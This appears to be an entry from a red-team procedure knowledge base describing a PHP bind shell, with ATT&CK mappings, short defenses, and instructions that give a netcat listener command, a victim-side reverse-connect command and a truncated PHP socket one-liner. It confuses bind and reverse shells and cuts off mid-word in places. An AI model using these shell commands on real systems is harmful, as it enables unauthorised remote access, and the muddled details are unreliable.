---
id: 76fb764c-6194-49a5-8b86-da80a71c1be6
name: PHP Bind Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.802220+00:00'
updated_at: '2023-04-10T20:21:13.587694+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
sub_techniques:
- '[[DNS|T1071.004 - DNS]]'
- '[[Web Protocols|T1071.001 - Web Protocols]]'
tags:
- '[[Bind Shell]]'
- '[[PHP]]'
---

# PHP Bind Shell

## Summary

A PHP Bind Shell is a type of shell that is used to establish a persistent backdoor on a target system. The shell allows an attacker to execute commands on the target system and access its resources. PHP Bind Shells are typically used as a post-exploitation technique to maintain access to a comprom

## Description

# Description

A PHP Bind Shell is a type of shell that is used to establish a persistent backdoor on a target system. The shell allows an attacker to execute commands on the target system and access its resources. PHP Bind Shells are typically used as a post-exploitation technique to maintain access to a compromised system. To establish a PHP Bind Shell, an attacker would typically upload a PHP script to a vulnerable web application and then execute it. The script would then listen on a specified port for incoming connections, and when a connection is received, it would spawn a shell that the attacker can use to execute commands on the target system. From a technical perspective, a PHP Bind Shell is a PHP script that listens on a specified port and spawns a shell when a connection is received. Business value: Attackers can use PHP Bind Shells to maintain access to a compromised system and steal sensitive data, install malware, or launch further attacks.

## Requirements

1. Access to a vulnerable web application

1. Ability to upload a PHP script

1. Network access to the target system

## Defense

1. Implement network segmentation to limit access to critical systems

1. Monitor network traffic for suspicious activity

1. Use strong authentication mechanisms to prevent unauthorized access to vulnerable web applications

## Objectives

1. Establish a persistent backdoor on the target system

1. Execute commands on the target system

1. Maintain access to the compromised system

# Instructions

1. This command creates a PHP reverse shell which allows the attacker to connect to the victim's machine and execute commands remotely. The attacker needs to run a netcat listener to receive the connection.

**Code**: [[php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_T]]

> -s: The IP address of the attacker's machine.
-p: The port number on which the attacker's machine is listening.

Example:

Attacker's machine: nc -lvnp 4444
Victim's machine: php reverse_shell.php -s 192.168.1.2 -p 4444

This will establish a connection between the attacker's and victim's machine and the attacker can execute commands remotely.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

### Sub-Techniques

- [[DNS|T1071.004 - DNS]]
- [[Web Protocols|T1071.001 - Web Protocols]]

## Tags

- [[Bind Shell]]
- [[PHP]]
